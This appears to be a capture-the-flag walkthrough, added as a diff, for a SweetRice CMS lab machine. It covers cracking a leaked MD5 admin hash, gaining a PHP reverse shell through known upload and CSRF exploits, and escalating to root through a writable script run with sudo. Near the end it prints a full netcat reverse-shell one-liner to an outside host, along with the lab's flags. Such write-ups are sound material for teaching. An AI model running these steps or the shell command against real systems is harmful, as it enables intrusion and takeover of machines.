@@ -1,0 +1,53 @@
+IP : 10.10.130.49
+
+Open Ports : 22,80
+
+Enumeration 80:
+	Apache2 Default page
+	
+Dir Search:
+	content:
+		Welcome message from sweetrice cms.
+
+Dir under content : 
+	/_themes (Status: 301)
+	/as (Status: 301)
+	/attachment (Status: 301)
+	/images (Status: 301)
+	/inc (Status: 301)
+	/index.php (Status: 200)
+	/js (Status: 301)
+
+Enumerating Direcotories:
+	mysql_backup : http://10.10.130.49/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
+
+Lets check that:
+	It is a php script to create a database.
+	We found a password under passwd keyword : 42f749ade7f9e195bf475f37a44cafcb
+	Lets check the hash type : md5
+	Lets use john to crack this. : Password123
+	From the same file we can see that it has admin username : manager
+	Lets verify that. : We can get in.
+
+Now we have authentication, lets check for exploits.
+	We have an authenticated file upload vulnerability : 40716 
+	Lets create a php reverse shell and check that out.
+	This uploads the file but some how it is not holding.
+	Lets checkout csrf rce : 40700
+	Lets add the php shell as an ad ang trigger it from /inc/ads/shell.php
+	We got a shell.
+	Lets try to get to home directory
+	We can read users flag : THM{63e5bce9271952aad1113b6f1ac28a07}
+	Lets check for sudo permissions:
+	We can run : (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+	Lets check it. : it is running:  system("sh", "/etc/copy.sh");
+	Lets check if we can write to it.
+	We cannot write to it but we can write to copy.sh.
+		-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
+		-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
+	Lets edit this file to get a reverse shell with nc.
+	echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.241.177 3333 >/tmp/f' > /etc/copy.sh
+	Start the listener and run the command with sudo
+	We receive a root shell.
+	Get the flag : THM{6637f41d0177b6f37cb20d775124699f}
+	
